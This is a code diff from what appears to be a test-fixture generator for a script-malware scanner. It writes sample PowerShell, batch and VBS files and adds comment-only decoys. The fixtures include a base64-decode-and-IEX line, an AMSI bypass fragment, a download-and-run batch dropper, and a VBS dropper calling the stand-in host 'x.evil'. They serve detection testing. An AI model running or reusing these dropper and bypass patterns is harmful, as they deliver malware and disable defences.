@@ -212,6 +212,9 @@ def build_folder(root):
     w("decoder.ps1", b"$p = [Convert]::FromBase64String($b); IEX([Text.Encoding]::Unicode.GetString($p))\n")
     w("tamper.ps1", b"[Ref].Assembly.GetType('S.System.Management.Automation.AmsiUtils')::" + _AMSI + b"()\n")
     w("benign.ps1", b"Write-Host 'hello game'\n")
+    w("docs.ps1", b"# docs: runs webclient downloadstring then iex (powershell -enc pattern)\n"
+                   b"# see also: certutil -urlcache notes\nWrite-Host 'done'\n")
+    w("docs.bat", b"@echo off\r\nREM powershell -enc AAAA hidden dropper notes\r\necho ok\r\n")
     w("dl.bat", ("@echo off\r\n%s %%TEMP%%\\a.exe\r\nstart %%TEMP%%\\a.exe\r\n" % _DL_CMD).encode())
     w("benign.bat", b"@echo off\r\necho Launching game\r\nstart game.exe\r\n")
     w("dropper.vbs", b'Set x = CreateObject("MSXML2.XMLHTTP")\nx.Open "GET", "http://x.evil/p", False\n'
